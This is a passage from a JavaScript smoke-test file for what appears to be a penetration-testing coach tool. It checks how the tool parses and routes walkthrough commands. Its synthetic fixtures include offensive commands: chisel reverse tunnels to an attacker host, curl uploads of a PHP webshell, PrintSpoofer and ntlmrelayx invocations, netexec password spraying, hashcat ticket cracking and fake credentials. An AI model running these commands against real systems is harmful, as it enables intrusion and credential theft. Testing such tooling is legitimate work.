    strippedMultiPortNmap.supported_kinds.includes('ports.open')
    && strippedMultiPortNmap.supported_kinds.includes('http.reachable'),
    JSON.stringify(strippedMultiPortNmap.supported_kinds));

  // 7B. Command-stripped tabular GP permission output (C2-2)
  const strippedGpTable = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostB,
    command: '',
    stdout: [
      'Trustee            TrusteeType Permission  Inherited',
      '-------            ----------- ----------  ---------',
      'Authenticated Users WellKnownGroup GpoEditDeleteModifySecurity False'
    ].join('\r\n')
  });
  check('Wave-C C2-2: command-stripped tabular Trustee/TrusteeType/Permission block mints ad.gpo_writable',
    strippedGpTable.supported_kinds.includes('ad.gpo_writable'),
    JSON.stringify(strippedGpTable.supported_kinds));

  // 7C. Command-stripped reordered Format-Table & UNC share rows (C2-3)
  const strippedPvTable = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostB,
    command: '',
    stdout: [
      'userprincipalname                samaccountname',
      '-----------------                --------------',
      'ops_reader@synthmesh.internal    ops_reader'
    ].join('\r\n')
  });
  const strippedUncShares = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostB,
    command: '',
    stdout: '\\\\NODE-B01\\DeployStore   - Internal deployment artifacts\r\n'
  });
  check('Wave-C C2-3: command-stripped Format-Table and UNC share lines mint ad.user_list and smb.shares',
    strippedPvTable.supported_kinds.includes('ad.user_list')
    && strippedUncShares.supported_kinds.includes('smb.shares'),
    JSON.stringify({ pv: strippedPvTable.supported_kinds, unc: strippedUncShares.supported_kinds }));

  // 7D. Command-stripped single-line and 2-line Windows custom-path ACLs (C2-4)
  const strippedWpOneLine = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostB,
    command: '',
    stdout: '\x1b[1;31mFile Permissions\x1b[0m "C:\\ProgramData\\MeshAgent\\runner.sys": SYNTHMESH\\ops_reader [WriteData/CreateFiles]\r\n'
  });
  const strippedWpTwoLine = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostB,
    command: '',
    stdout: [
      '  Path: C:\\MeshApps\\Worker\\service_host.exe',
      '  File Permissions: BUILTIN\\Users [AllAccess]'
    ].join('\r\n')
  });
  check('Wave-C C2-4: command-stripped 1-line (.sys) and 2-line Windows custom-path ACLs mint privesc.custom_binary',
    strippedWpOneLine.supported_kinds.includes('privesc.custom_binary')
    && strippedWpTwoLine.supported_kinds.includes('privesc.custom_binary')
    && strippedWpTwoLine.supported_kinds.includes('privesc.weak_service_permission'),
    JSON.stringify({ one: strippedWpOneLine.supported_kinds, two: strippedWpTwoLine.supported_kinds }));

  // 7E. Directory graph disabled/krbtgt/computer AS-REP negative guard (C3-1)
  const bhSandbox = sandboxLoader.createSandbox();
  const bhSession = sandboxLoader.createEngagementSession(bhSandbox, {
    target: hostB,
    lhost: '10.10.14.99'
  });
  const cleanBhBundle = [
    {
      name: 'users.json',
      text: JSON.stringify({
        meta: { type: 'users', count: 3, version: 5 },
        data: [
          {
            ObjectIdentifier: 'S-1-5-21-4100200300-5100600700-8100900100-502',
            Properties: { name: 'KRBTGT@SYNTHMESH.INTERNAL', samaccountname: 'krbtgt', domain: 'SYNTHMESH.INTERNAL', enabled: false, dontreqpreauth: true }
          },
          {
            ObjectIdentifier: 'S-1-5-21-4100200300-5100600700-8100900100-1120',
            Properties: { name: 'LEGACY_SVC@SYNTHMESH.INTERNAL', samaccountname: 'legacy_svc', domain: 'SYNTHMESH.INTERNAL', enabled: false, dontreqpreauth: true }
          },
          {
            ObjectIdentifier: 'S-1-5-21-4100200300-5100600700-8100900100-1121',
            Properties: { name: 'NODE01$@SYNTHMESH.INTERNAL', samaccountname: 'NODE01$', domain: 'SYNTHMESH.INTERNAL', enabled: true, dontreqpreauth: true }
          }
        ]
      })
    }
  ];
  const cleanBhOut = bhSession.ingestBloodHound(cleanBhBundle, {
    owned: ['OPS_READER@SYNTHMESH.INTERNAL'],
    scope: 'domain:SYNTHMESH.INTERNAL'
  });
  const cleanBhKinds = (cleanBhOut.facts || []).filter(f => f.state === 'supported').map(f => f.kind);
  check('Wave-C C3-1: disabled, krbtgt (-502), and computer accounts with dontreqpreauth do NOT mint ad.asrep_roastable',
    !cleanBhKinds.includes('ad.asrep_roastable'),
    JSON.stringify(cleanBhKinds));

  // 7F. Stock Windows SYSTEM / Administrators ACL lines negative guard (C3-2)
  const stockWinAcl = sandboxLoader.probeBlockStateless(OBOL, {
    target: hostB,
    command: '.\\winPEASx64.exe',
    stdout: [
      'File Permissions "C:\\Windows\\System32\\svchost.exe": NT AUTHORITY\\SYSTEM [AllAccess]',
      'File Permissions "C:\\Program Files\\Vendor\\GuardSvc.exe": BUILTIN\\Administrators [FullControl]'
    ].join('\n')
  });
  check('Wave-C C3-2: stock NT AUTHORITY\\SYSTEM [AllAccess] and BUILTIN\\Administrators [FullControl] emit 0 privesc.* facts',
    !stockWinAcl.supported_kinds.some(k => /^privesc\./.test(k)),
    JSON.stringify(stockWinAcl.supported_kinds));

  // 7G. Diagnostic prose & UI Fix Card rendering for unterminated string and Java wrapper flags (C4-1, C4-2)
  const uiSb = sandboxLoader.createSandbox();
  const uiSess = sandboxLoader.createEngagementSession(uiSb, {
    target: hostA,
    lhost: '10.10.14.99',
    lport: '4444'
  });
  uiSess.ingestTurn({
    target: hostA,
    command: 'cat 98101.py',
    stdout: [
      '#!/usr/bin/env python3',
      '# EDB-ID: 98101',
      'import requests',
      'body = "POST /v1/run HTTP/1.1',
      'Host: target"',
      'print(body)'
    ].join('\n')
  });
  const py3Doc = (uiSb.FIELD_DOCTORS || {})['exploit.hazard_py3_syntax'] || {};
  check('Wave-C C4-1: exploit.hazard_py3_syntax field note explains unterminated multi-line string literal repair',
    uiSess.factSetForTarget(hostA).has('exploit.hazard_py3_syntax')
    && /unterminated|multi-line|newline|string literal/i.test([py3Doc.title, py3Doc.why, py3Doc.body].join(' ')),
    JSON.stringify(py3Doc));

  const uiSb2 = sandboxLoader.createSandbox();
  const uiSess2 = sandboxLoader.createEngagementSession(uiSb2, {
    target: hostA,
    lhost: '10.10.14.99',
    lport: '4444'
  });
  uiSess2.ingestTurn({
    target: hostA,
    command: 'cat 98102.py',
    stdout: [
      '#!/usr/bin/env python3',
      '# EDB-ID: 98102',
      'import subprocess',
      'subprocess.check_call("javac -source 1.6 -target 1.6 Stub.java", shell=True)'
    ].join('\n')
  });
  uiSess2.computeCoach(hostA);
  const renderedPathHtml = uiSb2.routes.path.render();
  const fixCodes = Array.from(renderedPathHtml.matchAll(/<pre class="fix-card-code"><code>([\s\S]*?)<\/code><\/pre>/g)).map(m => m[1]);
  const javaFixCode = fixCodes.find(c => /javac|source|release/.test(c)) || '';
  check('Wave-C C4-2: exploit.hazard_java_target Fix Card on Python wrapper updates flags without invoking javac on .py',
    Boolean(javaFixCode)
    && javaFixCode.includes('98102.py')
    && !/\bjavac\b[^\r\n]*\b98102\.py\b/.test(javaFixCode),
    javaFixCode);

  // 7H. Multi-protocol nxc-arsenal dry-probe retirement across SMB + WinRM userlist commands (C5-1)
  const drySb = sandboxLoader.createSandbox();
  const drySess = sandboxLoader.createEngagementSession(drySb, {
    targets: [hostA, hostB],
    lhost: '10.10.14.99',
    multiTarget: true
  });
  [hostA, hostB].forEach(ip => {
    drySess.ingestTurn({
      target: ip,
      forceTarget: ip,
      command: 'nmap -sV -p 445,5985 ' + ip,
      stdout: 'PORT STATE SERVICE VERSION\n445/tcp open microsoft-ds Windows Server 2019\n5985/tcp open wsman Microsoft HTTPAPI httpd 2.0\nNmap done: 1 IP address (1 host up) scanned in 0.8s'
    });
  });
  drySb.store.addFacts([
    { kind: 'credential.available', scope: 'host:' + hostA, state: 'supported', value: { user: 'svc_worker', domain: 'synthmesh.internal', password: 'MeshPass_Alpha1!' } },
    { kind: 'credential.available', scope: 'host:' + hostA, state: 'supported', value: { user: 'ops_reader', domain: 'synthmesh.internal', password: 'MeshPass_Beta2!' } },
    { kind: 'credential.available', scope: 'host:' + hostB, state: 'supported', value: { user: 'svc_worker', domain: 'synthmesh.internal', password: 'MeshPass_Alpha1!' } }
  ], 'synthetic-wavec', hostA);
  const allDryCreds = drySb.context.credentials(drySess.eng);
  const c1 = allDryCreds.find(c => c.user === 'svc_worker');
  const c2 = allDryCreds.find(c => c.user === 'ops_reader');
  drySb.context.select(drySess.eng, c1.id, hostA);
  const snapPre = drySess.snapshot();
  const preKindsA = drySess.factSetForTarget(hostA).facts.filter(f => f.state === 'supported').map(f => f.kind).sort();
  drySess.restore(snapPre);
  check('Wave-C C5-1a: snapshot()/restore() round-trips session state cleanly',
    JSON.stringify(preKindsA) === JSON.stringify(drySess.factSetForTarget(hostA).facts.filter(f => f.state === 'supported').map(f => f.kind).sort()));

  const coachPre = drySess.computeCoach(hostA);
  const nxcCard = coachPre.onFlow.concat(coachPre.alsoEligible || []).find(m => m.id === 'nxc-arsenal');
  if (nxcCard) {
    harvestTraj.simulateRetireMoveInSandbox(drySb, drySess, nxcCard, hostA);
  }
  const coachAfterC1 = drySess.computeCoach(hostA);
  const retiredForC1HostA = !coachAfterC1.onFlow.concat(coachAfterC1.alsoEligible || []).some(m => m.id === 'nxc-arsenal');
  drySb.context.select(drySess.eng, c2.id, hostA);
  const coachForC2HostA = drySess.computeCoach(hostA);
  const liveForC2HostA = coachForC2HostA.onFlow.concat(coachForC2HostA.alsoEligible || []).some(m => m.id === 'nxc-arsenal');
  drySess.setActiveTarget(hostB);
  drySb.context.select(drySess.eng, c1.id, hostB);
  const coachForC1HostB = drySess.computeCoach(hostB);
  const liveForC1HostB = coachForC1HostB.onFlow.concat(coachForC1HostB.alsoEligible || []).some(m => m.id === 'nxc-arsenal');
  check('Wave-C C5-1b: multi-protocol nxc-arsenal dry-probe retires (cred1, hostA) while keeping (cred2, hostA) and (cred1, hostB) eligible',
    Boolean(nxcCard) && retiredForC1HostA && liveForC2HostA && liveForC1HostB,
    JSON.stringify({ hasCard: Boolean(nxcCard), retiredForC1HostA, liveForC2HostA, liveForC1HostB }));

  // 7I. ftp-webroot-upload-webshell HTTP port equivalence gate (C7-1)
  const ftpAct = OBOL.packs.actions().find(a => a.id === 'ftp-webroot-upload-webshell');
  const FactSet = OBOL.facts.FactSet;
  const portAndFtpFacts = new FactSet([
    { kind: 'port:21', scope: 'host:' + hostA, state: 'supported', value: { port: 21 } },
    { kind: 'port:80', scope: 'host:' + hostA, state: 'supported', value: { port: 80 } },
    { kind: 'ftp.anon_write', scope: 'host:' + hostA, state: 'supported', value: {} }
  ]);
  const portOnlyNoFtpFacts = new FactSet([
    { kind: 'port:80', scope: 'host:' + hostA, state: 'supported', value: { port: 80 } }
  ]);
  const ftpOnlyNoHttpFacts = new FactSet([
    { kind: 'port:21', scope: 'host:' + hostA, state: 'supported', value: { port: 21 } },
    { kind: 'ftp.anon_write', scope: 'host:' + hostA, state: 'supported', value: {} }
  ]);
  check('Wave-C C7-1: ftp-webroot-upload-webshell is eligible on port:80 + ftp.anon_write and blocked when either surface is missing',
    Boolean(ftpAct)
    && ftpAct.eligible(portAndFtpFacts) === true
    && ftpAct.eligible(portOnlyNoFtpFacts) === false
    && ftpAct.eligible(ftpOnlyNoHttpFacts) === false);
}

// ---- 8. Cohort CL-2 Wave-B Slice B4 Generalizations --------------------------
{
  // 8A. Generalized RFC1918 dynamic 3rd-octet revert aliasing (172.16..31 & 10.x)
  //     with sibling-host corroboration across interleaved sections + co-occurrence veto
  const interleavedRevertTurns = [
    { command: 'nmap -sV -p 80,445 172.24.210.41', stdout: 'Nmap scan report for 172.24.210.41\n80/tcp open http\n445/tcp open microsoft-ds' },
    { command: 'nmap -sV -p 22,80 172.24.222.41', stdout: 'Nmap scan report for 172.24.222.41\n80/tcp open http\n445/tcp open microsoft-ds' },
    { command: 'curl -I http://172.24.210.41/', stdout: 'HTTP/1.1 200 OK' },
    { command: 'nmap -sV -p 445,5985 172.24.210.42', stdout: 'Nmap scan report for 172.24.210.42\n445/tcp open microsoft-ds\n5985/tcp open wsman' },
    { command: 'nxc smb 172.24.222.42 -u acct_alpha -p SynthKey_42!', stdout: 'SMB 172.24.222.42 445 NODE42 [+] synth.local\\acct_alpha:SynthKey_42!' }
  ];
  const alias172 = harvestTraj.detectSequentialRevertAliases(interleavedRevertTurns, new Set(['10.10.14.99']), '');
  check('CL-2 B4-1a: 172.24 dynamic 3rd-octet revert merges corroborated sibling hosts across interleaved turns',
    alias172['172.24.222.41'] === '172.24.210.41' && alias172['172.24.222.42'] === '172.24.210.42',
    JSON.stringify(alias172));

  const nonTenTenTurns = [
    { command: 'nmap -p 22,80 10.240.110.51', stdout: 'Nmap scan report for 10.240.110.51\n22/tcp open ssh\n80/tcp open http' },
    { command: 'curl -I http://10.240.125.51/', stdout: 'HTTP/1.1 200 OK' }
  ];
  const alias10x = harvestTraj.detectSequentialRevertAliases(nonTenTenTurns, new Set(['10.10.14.99']), '');
  check('CL-2 B4-1b: 10.<oct2> (non-10.10) sequential 3rd-octet revert normalizes to canonical IP',
    alias10x['10.240.125.51'] === '10.240.110.51',
    JSON.stringify(alias10x));

  const realDualSubnetTurns = [
    { command: 'ip a', stdout: 'inet 172.24.1.41/24 brd 172.24.1.255\ninet 172.24.2.1/24 brd 172.24.2.255', host: 'pivot01' },
    { command: 'nmap -p 445 172.24.1.41', stdout: '445/tcp open microsoft-ds' },
    { command: 'nmap -p 445 172.24.2.41', stdout: '445/tcp open microsoft-ds' },
    { command: 'nmap -p 445 172.24.1.42', stdout: '445/tcp open microsoft-ds' },
    { command: 'nmap -p 445 172.24.2.42', stdout: '445/tcp open microsoft-ds' }
  ];
  const aliasDual = harvestTraj.detectSequentialRevertAliases(realDualSubnetTurns, new Set(['10.10.14.99']), '');
  check('CL-2 B4-1c: co-occurring dual-NIC subnets are never false-merged as revert aliases',
    Object.keys(aliasDual).length === 0,
    JSON.stringify(aliasDual));

  // 8B. Bare `#` comment non-splitting inside decorated-prompt stdout and unprompted dumps
  //     vs valid `#` root subshell transitions
  const bashrcDumpMd = [
    '```console',
    'ops@node01:~$ cat ~/.bashrc',
    '# ~/.bashrc: executed by bash(1) for non-login shells.',
    '# set variable identifying the chroot you work in (used in the prompt below)',
    '# export HISTCONTROL=ignoreboth',
    '# make less more friendly for non-text input files, see lesspipe(1)',
    '# $FreeBSD: release/13.0/etc/master.passwd 100200 2026-01-01 $',
    '# Results',
    'export DB_PASS="SynthBashrc_88!"',
    '```'
  ].join('\n');
  const bashrcRes = mdExtractor.extractWalkthroughTurns(bashrcDumpMd, { slug: 'synth-bashrc' });
  check('CL-2 B4-2a: bare # comments inside decorated-prompt stdout do not split turn',
    bashrcRes.turns.length === 1
    && bashrcRes.turns[0].command === 'cat ~/.bashrc'
    && bashrcRes.turns[0].stdout.includes('SynthBashrc_88!')
    && bashrcRes.turns[0].stdout.includes('# export HISTCONTROL=ignoreboth'),
    JSON.stringify(bashrcRes.turns));

  const unpromptedSqlMd = [
    '```powershell',
    'type db_connect.sql',
    "$DbHost = 'SQLNODE01'",
    "$DbLogin = 'synth.local\\svc_sql'",
    "$DbSecret = 'SynthSql_55!'",
    '# query to show changes',
    'SELECT @@VERSION;',
    '```'
  ].join('\n');
  const unpromptedSqlRes = mdExtractor.extractWalkthroughTurns(unpromptedSqlMd, { slug: 'synth-sql-comment' });
  check('CL-2 B4-2b: inline # prose comment inside unprompted file read preserves preceding lines',
    unpromptedSqlRes.turns.length === 1
    && unpromptedSqlRes.turns[0].command === 'type db_connect.sql'
    && unpromptedSqlRes.turns[0].stdout.includes('SynthSql_55!')
    && unpromptedSqlRes.turns[0].stdout.includes('SELECT @@VERSION;'),
    JSON.stringify(unpromptedSqlRes.turns));

  const subshellMd = [
    '```console',
    'ops@node01:~$ /usr/local/bin/doas /bin/sh',
    '# id',
    'uid=0(root) gid=0(wheel) groups=0(wheel)',
    '# cat /root/proof.txt',
    '0123456789abcdef0123456789abcdef',
    '```'
  ].join('\n');
  const subshellRes = mdExtractor.extractWalkthroughTurns(subshellMd, { slug: 'synth-doas-subshell' });
  check('CL-2 B4-2c: interactive subshell launcher transitions cleanly into bare # root turns',
    subshellRes.turns.length === 3
    && subshellRes.turns[0].command === '/usr/local/bin/doas /bin/sh'
    && subshellRes.turns[1].command === 'id'
    && subshellRes.turns[2].command === 'cat /root/proof.txt',
    JSON.stringify(subshellRes.turns.map(t => t.command)));

  // 8C. Tab-indented list fences, RAW_ARTIFACT_HEADER_RE line-1 preservation, and Step/cd lead skipping
  const listIndentedPemMd = [
    '- Retrieved SSH private key from backup archive:',
    '\t```bash',
    '\t-----BEGIN OPENSSH PRIVATE KEY-----',
    '\tb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW',
    '\t-----END OPENSSH PRIVATE KEY-----',
    '\t```',
    '- Inspected commit metadata:',
    '    ```',
    '    commit 0123456789abcdef0123456789abcdef01234567',
    '    Author: Ops Builder <ops@synth.local>',
    '    ```'
  ].join('\n');
  const listFenceRes = mdExtractor.extractWalkthroughTurns(listIndentedPemMd, { slug: 'synth-list-fences' });
  check('CL-2 B4-3a: tab/space-indented list fences extract and preserve RAW_ARTIFACT_HEADER_RE line 1 in stdout',
    listFenceRes.turns.length === 2
    && listFenceRes.turns[0].command === ''
    && /^-----BEGIN OPENSSH PRIVATE KEY-----/.test(listFenceRes.turns[0].stdout)
    && listFenceRes.turns[1].command === ''
    && /^commit 0123456789abcdef0123456789abcdef01234567/.test(listFenceRes.turns[1].stdout),
    JSON.stringify(listFenceRes.turns));

  const stepAndCdLeadMd = [
    '```cmd',
    'Step 2 - Trigger token impersonation',
    'PrintSpoofer64.exe -i -c "powershell -ep bypass"',
    '[+] Found privilege: SeImpersonatePrivilege',
    '```',
    '',
    '```bash',
    'cd ~/tools/relay',
    'python3 ntlmrelayx.py --no-http-server -smb2support -tf targets.txt',
    '[*] Servers started, waiting for connections',
    '```'
  ].join('\n');
  const stepAndCdRes = mdExtractor.extractWalkthroughTurns(stepAndCdLeadMd, { slug: 'synth-step-cd' });
  check('CL-2 B4-3b: unprompted Step header and cd lead skip forward to actual CLI tool invocation',
    stepAndCdRes.turns.length === 2
    && /^PrintSpoofer64\.exe\b/.test(stepAndCdRes.turns[0].command)
    && /^python3 ntlmrelayx\.py\b/.test(stepAndCdRes.turns[1].command),
    JSON.stringify(stepAndCdRes.turns.map(t => t.command)));

  // 8D. sudo hashcat wrapper stripping + -m:<mode> pairing (13100 vs 13400 vs modular)
  const krbCrackMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'sudo hashcat -m 13100 tgs_ticket.hash /usr/share/wordlists/rockyou.txt --force',
    kind: 'unix',
    host: 'kali'
  }, {});
  const krbCrackIds = krbCrackMatches.map(m => m.id);
  check('CL-2 B4-4a: sudo hashcat -m 13100 routes to crack-tgs/crack-kerberoast and excludes crack-modular-hash',
    (krbCrackIds.includes('crack-tgs') || krbCrackIds.includes('crack-kerberoast'))
    && !krbCrackIds.includes('crack-modular-hash')
    && !krbCrackIds.includes('crack-ntlm'),
    JSON.stringify(krbCrackIds));

  const kdbxCrackMatches = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'hashcat -m 13400 vault_db.hash /usr/share/wordlists/rockyou.txt --force',
    kind: 'unix',
    host: 'kali'
  }, {});
  const kdbxCrackIds = kdbxCrackMatches.map(m => m.id);
  check('CL-2 B4-4b: hashcat -m 13400 routes to keepass-dump-recover without wrong-mode hashcat collisions',
    kdbxCrackIds[0] === 'keepass-dump-recover'
    && !kdbxCrackIds.includes('crack-modular-hash'),
    JSON.stringify(kdbxCrackIds));

  // 8E. netexec rdp disambiguation, curl -F upload boost, find -writable routing, and ad.graph.collected repeat
  const nxcRdpAuthIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: "netexec rdp 10.240.10.20 -u 'acct_alpha' -p 'SynthPass_77!'",
    kind: 'unix',
    host: 'kali'
  }, {}).map(m => m.id);
  check('CL-2 B4-5a: authenticated netexec rdp probe routes to credential validation/rdp moves and excludes flag-hunt/local-enum',
    nxcRdpAuthIds.includes('validate-credential')
    && !nxcRdpAuthIds.some(id => /^flag-hunt-/.test(id))
    && !nxcRdpAuthIds.includes('windows-enum'),
    JSON.stringify(nxcRdpAuthIds));

  const nxcRdpSprayIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'nxc rdp 10.240.10.20 -u users.txt -p passwords.txt',
    kind: 'unix',
    host: 'kali'
  }, {}).map(m => m.id);
  check('CL-2 B4-5b: netexec rdp wordlist spray routes to online-brute-rdp / password-spray',
    nxcRdpSprayIds[0] === 'online-brute-rdp' || nxcRdpSprayIds.includes('password-spray'),
    JSON.stringify(nxcRdpSprayIds));

  const curlUploadIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'curl -s -X POST -F "file=@shell.php" http://10.240.10.20/upload.php',
    kind: 'unix',
    host: 'kali'
  }, {}).map(m => m.id);
  check('CL-2 B4-5c: curl -F multipart upload routes directly to file-upload',
    curlUploadIds[0] === 'file-upload',
    JSON.stringify(curlUploadIds));

  const findWritableIds = harvestTraj.matchTurnToCatalogMoves(OBOL, {
    command: 'find / -writable -type d 2>/dev/null',
    kind: 'unix',
    host: 'node01',
    user: 'www-data'
  }, {}).map(m => m.id);
  check('CL-2 B4-5d: find / -writable routes to linux-enum and excludes systemd-timer-abuse',
    findWritableIds[0] === 'linux-enum' && !findWritableIds.includes('systemd-timer-abuse'),
    JSON.stringify(findWritableIds));

  const bhRepeatSb = sandboxLoader.createSandbox();
  const bhRepeatHost = '10.240.10.30';
  const bhRepeatSess = sandboxLoader.createEngagementSession(bhRepeatSb, {
    target: bhRepeatHost,
    lhost: '10.10.14.99'
  });
  bhRepeatSb.store.addFacts([
    { kind: 'port:88', scope: 'host:' + bhRepeatHost, state: 'supported', value: { port: 88 } },
    { kind: 'port:389', scope: 'host:' + bhRepeatHost, state: 'supported', value: { port: 389 } },
    { kind: 'port:445', scope: 'host:' + bhRepeatHost, state: 'supported', value: { port: 445 } },
    { kind: 'ad.domain_known', scope: 'host:' + bhRepeatHost, state: 'supported', value: { domain: 'synth.local' } },
    { kind: 'credential.available', scope: 'host:' + bhRepeatHost, state: 'supported', value: { user: 'acct_alpha', domain: 'synth.local', password: 'SynthPass_77!' } },
    { kind: 'credential.validated', scope: 'host:' + bhRepeatHost, state: 'supported', value: { user: 'acct_alpha', domain: 'synth.local', password: 'SynthPass_77!' } },
    { kind: 'ad.graph.collected', scope: 'host:' + bhRepeatHost, state: 'supported', value: {} }
  ], 'synthetic-b4', bhRepeatHost);
  const bhTurn = {
    command: "bloodhound-python -d synth.local -u acct_alpha -p 'SynthPass_77!' -c All -ns " + bhRepeatHost,
    kind: 'unix',
    host: 'kali'
  };
  const bhCands = harvestTraj.matchTurnToCatalogMoves(bhRepeatSb, bhTurn, {});
  const bhReach = harvestTraj.evaluateClosedLoopReachability(
    bhRepeatSess,
    bhCands,
    bhTurn,
    { targetIp: bhRepeatHost }
  );
  check('CL-2 B4-5e: bloodhound-collect is reachable (already_settled_repeat or top1) when ad.graph.collected is supported',
    bhReach.reachable === true && (bhReach.mode === 'already_settled_repeat' || bhReach.mode === 'direct_top1' || bhReach.mode === 'closed_loop_promoted_top1'),
    JSON.stringify(bhReach));

  // 8F. Reverse-tunnel (chisel R:<lport>:127.0.0.1:<rport>) loopback target continuity across multi-host switching
  const tunHostA = '172.24.210.41';
  const tunHostB = '172.24.210.42';
  const tunReplay = harvestTraj.replayWalkthrough(sandboxLoader.createSandbox(), {
    slug: 'synth-chisel-loopback',
    turns: [
      { command: 'nmap -sV -p 80,445 ' + tunHostA, stdout: 'Nmap scan report for ' + tunHostA + '\n80/tcp open http\n445/tcp open microsoft-ds', host: 'kali', kind: 'unix' },
      { command: 'nmap -sV -p 22,80 ' + tunHostB, stdout: 'Nmap scan report for ' + tunHostB + '\n22/tcp open ssh\n80/tcp open http', host: 'kali', kind: 'unix' },
      { command: 'chisel client 10.10.14.99:8001 R:9000:127.0.0.1:8000', stdout: 'client: Connected (Latency 1.2ms)', host: 'node42', user: 'www-data', kind: 'unix' },
      { command: 'nmap -sV -p 445 ' + tunHostA, stdout: 'Nmap scan report for ' + tunHostA + '\n445/tcp open microsoft-ds', host: 'kali', kind: 'unix' },
      { command: 'curl -s -X POST -F "file=@shell.php" http://127.0.0.1:9000/upload.php', stdout: 'HTTP/1.1 200 OK', host: 'kali', kind: 'unix' }
    ]
  }, { multiTarget: true, lhost: '10.10.14.99' });
  check('CL-2 B4-6: reverse-forwarded 127.0.0.1:<lport> attacker turn attributes back to tunnel endpoint host after host switch',
    tunReplay.steps[3].target_ip === tunHostA
    && tunReplay.steps[4].target_ip === tunHostB
    && tunReplay.steps[4].matched_moves[0] === 'file-upload',
    JSON.stringify(tunReplay.steps.map(s => ({ cmd: s.command, target: s.target_ip, moves: s.matched_moves }))));

  // 8G. Chisel Go HH:MM:SS log timestamps never pollute pivot.ports or mint pivot.ports on R:socks
  const chiselFwdRes = OBOL.parsers.parseActionOutput({
    command: 'chisel client 198.51.100.10:8000 R:10445:203.0.113.45:445',
    stdout: '2026/10/30 12:00:02 client: Connecting to ws://198.51.100.10:8000\n2026/10/30 12:00:02 client: Connected (Latency 1.5ms)',
    scope: 'host:203.0.113.10'
  });
  const chiselFwdPortsFacts = (chiselFwdRes.facts || []).filter(f => f.kind === 'pivot.ports');
  check('CL-2 B1 chisel timestamp guard (port-forward): R:10445:203.0.113.45:445 records only 10445 -> 203.0.113.45:445 without HH:MM:SS pollution',
    chiselFwdPortsFacts.length === 1
    && JSON.stringify(chiselFwdPortsFacts[0].value.ports) === JSON.stringify([445, 10445])
    && chiselFwdPortsFacts[0].value.forwards.length === 1
    && chiselFwdPortsFacts[0].value.forwards[0].local_port === 10445
    && chiselFwdPortsFacts[0].value.forwards[0].remote_host === '203.0.113.45'
    && chiselFwdPortsFacts[0].value.forwards[0].remote_port === 445,
    JSON.stringify(chiselFwdPortsFacts));

  const chiselSocksRes = OBOL.parsers.parseActionOutput({
    command: 'chisel client 198.51.100.10:8000 R:socks',
    stdout: '2026/10/30 14:35:22 client: Connecting to ws://198.51.100.10:8000\n2026/10/30 14:35:22 client: Connected (Latency 2.1ms)',
    scope: 'host:203.0.113.10'
  });
  const chiselSocksPortsFacts = (chiselSocksRes.facts || []).filter(f => f.kind === 'pivot.ports');
  check('CL-2 B1 chisel timestamp guard (R:socks): Go HH:MM:SS log timestamp emits 0 pivot.ports facts',
    chiselSocksPortsFacts.length === 0
    && (chiselSocksRes.facts || []).some(f => f.kind === 'tunnel.socks')
    && (chiselSocksRes.facts || []).some(f => f.kind === 'pivot.active' && f.value.mode === 'socks'),
    JSON.stringify(chiselSocksRes.facts));
}

console.log('challenge-labs-trajectories-smoke: ' + passed + ' assertions passed.');
